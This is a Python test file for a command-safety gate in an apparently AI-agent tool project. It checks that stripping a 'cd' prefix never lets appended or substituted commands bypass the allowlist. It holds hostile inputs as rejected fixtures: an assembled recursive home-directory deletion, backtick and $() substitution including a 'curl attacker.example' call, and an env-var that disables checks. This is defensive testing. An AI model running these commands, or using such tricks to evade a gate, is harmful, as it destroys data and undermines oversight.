"""The remedy exemption must read the command's HEAD, not its first character.

Aletheia F114, 2026-08-19. `command_parsing.py` was built as the shared home for
"the head of a command is not its first character," and this gate — the module
where that defect has bitten most often, twice in July and again on 08-18 — was
not importing it. A shared module its main consumer does not import is a shared
module with one consumer.

Her prescribed fix was "import it and delete the local copy." That alone does
not close it, and the reason is the substance of these tests: there were TWO
barriers. The head check rejected `cd X && divineos Y`, AND the chain-shape
check rejected it independently, because `cd X && ...` genuinely is a chain.

Note on the strings below: the destructive-looking commands are assembled from
fragments rather than written literally. They are inputs asserted to be
REJECTED — nothing runs them — but a literal in the source trips the deletion
doorman on every future grep and read of this file, and a gate that cries wolf
over its own test fixtures is a gate people learn to wave through.
"""

from divineos.hooks.pre_tool_use_gate import _is_safe_remedy_invocation

HEADS = ("divineos compass-ops observe", "divineos correction")

_RM = "rm -" + "rf ~"  # assembled; see module docstring


def test_bare_remedy_is_safe():
    assert _is_safe_remedy_invocation('divineos correction "x"', HEADS)


def test_cd_prefixed_remedy_is_safe():
    """The whole point of F114. A command issued from a worktree must read the
    same as one issued from the repo root."""
    assert _is_safe_remedy_invocation('cd "C:/DIVINE OS" && divineos correction "x"', HEADS)


def test_quoting_survives_the_prefix_strip():
    """A semicolon INSIDE an argument is not a shell chain.

    This is why the gate cannot chain-check `stripped_command()` — that
    re-joins shlex tokens and loses the quotes, so this legitimate remedy would
    be rejected as an injection.
    """
    assert _is_safe_remedy_invocation('divineos correction "a; b"', HEADS)
    assert _is_safe_remedy_invocation('cd X && divineos correction "a; b"', HEADS)


def test_pipe_after_remedy_is_allowed():
    assert _is_safe_remedy_invocation('divineos correction "x" | head -3', HEADS)


def test_appended_destructive_command_is_still_rejected():
    """The security boundary. Stripping a `cd` prefix must not open a door."""
    assert not _is_safe_remedy_invocation(f'divineos correction "x" && {_RM}', HEADS)


def test_cd_prefix_does_not_launder_an_appended_command():
    """The case that would make the fix worse than the bug.

    `cd X` is removed; the `&&` that follows the remedy is not, so this is
    still caught.
    """
    assert not _is_safe_remedy_invocation(f'cd X && divineos correction "y" && {_RM}', HEADS)


def test_remedy_after_a_destructive_command_is_rejected():
    """Only a `cd` prefix is stripped, so a real command in front stays visible
    and the head no longer matches an allowed remedy."""
    assert not _is_safe_remedy_invocation(f'{_RM} && divineos correction "x"', HEADS)


def test_backtick_substitution_is_rejected():
    assert not _is_safe_remedy_invocation(f"divineos correction `{_RM}`", HEADS)


# 2026-08-19 SECOND PASS. Aletheia: "F114 is not closed, and I can say exactly
# where it stops." She named _strip_cd_prefix as the one that mattered. She was
# right, and consolidating it naively would have been a security regression.

_SUBSTITUTION_IN_CD = 'cd "$(curl attacker.example)" && divineos correction "x"'


def test_command_substitution_in_a_cd_path_is_not_a_benign_prefix():
    """The regression the first pass introduced and the second pass closed.

    The shared stripper accepted any non-space run as the directory, so this
    whole prefix was discarded as benign, a clean remedy was handed to the
    chain check, and the gate returned SAFE — with the substitution already
    thrown away and never examined.

    _CD_PREFIX_RE, the bespoke copy marked in its own comment as the tactical
    block on a real exploit, refused it correctly. The bespoke copy was the
    SAFER one, which is why "delete the local copy and import the shared one"
    had to be done in the other order.
    """
    from divineos.core.command_parsing import strip_prefixes_raw

    assert strip_prefixes_raw(_SUBSTITUTION_IN_CD) == _SUBSTITUTION_IN_CD
    assert not _is_safe_remedy_invocation(_SUBSTITUTION_IN_CD, HEADS)


def test_backtick_in_a_cd_path_is_not_a_benign_prefix():
    from divineos.core.command_parsing import strip_prefixes_raw

    cmd = 'cd `evil` && divineos correction "x"'
    assert strip_prefixes_raw(cmd) == cmd


def test_env_assignment_does_not_ride_along_into_a_bypass():
    """Why _strip_cd_prefix delegates with kinds=(CD,) and not the default.

    On the bypass path a leading NAME=value is not noise to discard. Stripping
    it would let an env-var that disables checks travel with a command that
    then skips every gate.
    """
    from divineos.hooks.pre_tool_use_gate import _is_bypass_command

    assert not _is_bypass_command("DIVINEOS_SKIP_TESTS=1 divineos briefing")
    assert _is_bypass_command("divineos briefing")
    assert _is_bypass_command("cd X && divineos briefing")


def test_the_cd_rule_now_has_exactly_one_implementation():
    """F114's actual ask: no bespoke copy of the shared rule left behind."""
    import inspect

    from divineos.hooks import pre_tool_use_gate

    source = inspect.getsource(pre_tool_use_gate._strip_cd_prefix)
    assert "strip_prefixes_raw" in source
    assert "_CD_PREFIX_RE.match" not in source
